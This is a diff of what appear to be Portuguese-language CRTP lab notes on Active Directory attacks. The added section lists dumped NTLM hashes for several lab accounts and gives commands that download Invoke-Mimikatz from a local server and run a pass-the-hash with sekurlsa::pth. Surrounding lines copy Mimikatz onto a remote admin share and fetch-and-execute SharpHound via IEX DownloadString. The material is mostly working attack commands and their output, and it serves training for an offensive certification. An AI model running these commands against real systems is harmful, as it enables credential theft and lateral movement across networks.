@@ -2663,6 +2663,20 @@ curl http://172.16.99.209/oscp/crtp/Invoke-Mimikatz2.ps1 -outfile Invoke-Mimikat
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 .\InvokeMimikatzEx.ps1
 ```
+VAI OBTER OS NTLM HASHES:
+- srvadmin:a98e18228819e8eec3dfa33cb68b0728
+- appadmin:d549831a955fee51a43c83efb3928fa7
+- websvc:cc098f204c5887eaa8253e7c2749156f
+- DCORP-ADMINSRV$:5e77978a734e3a7f3895fb0fdbda3b96
+NA MINHA MAQUINA FAZER O PASS THE HASH.(PROMPT ELEVADO NA MAQUINA DO ESTUDANTE)
+```
+curl http://172.16.99.209/oscp/crtp/Invoke-Mimikatz.ps1 -outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+```
+
+
+
 ##### POWERSHELL - RODAR BLOODHOUND (BAIXAR A VERSÃO DO CRTP E INSTALAR NO WINDOWS)
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/SharpHound.ps1")
